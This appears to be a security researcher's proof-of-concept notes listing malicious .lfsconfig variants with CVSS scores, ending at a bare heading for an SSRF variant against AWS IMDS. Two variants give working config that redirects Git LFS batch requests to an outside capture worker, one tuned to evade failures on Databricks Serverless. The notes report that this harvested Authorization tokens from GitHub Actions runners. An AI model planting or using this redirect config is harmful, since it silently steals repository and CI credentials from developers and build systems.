.lfsconfig Variations

V1 — Credential Capture (POC-A / DTB-2) CVSS 7.5

Redirects LFS batch API to capture worker. Intercepts Authorization headers (SHA-256 hashed).

Proven: 181 captures, 2 unique tokens from GitHub Actions runners.

[lfs]
  url = https://lfs-capture.everton-win32.workers.dev

Served at: .lfsconfig

V2 — Databricks LFS Redirect + fetchexclude (DTB-2 + DTB-6) CVSS 8.2

Same redirect but with fetchexclude to avoid fetch failures in Serverless. Credentials still captured on batch POST.

[lfs]
  url = https://lfs-capture.everton-win32.workers.dev
  fetchexclude = *

Served at: v2-databricks-lfsconfig

V3 — SSRF to AWS IMDS (DTB-5) CVSS 5.3
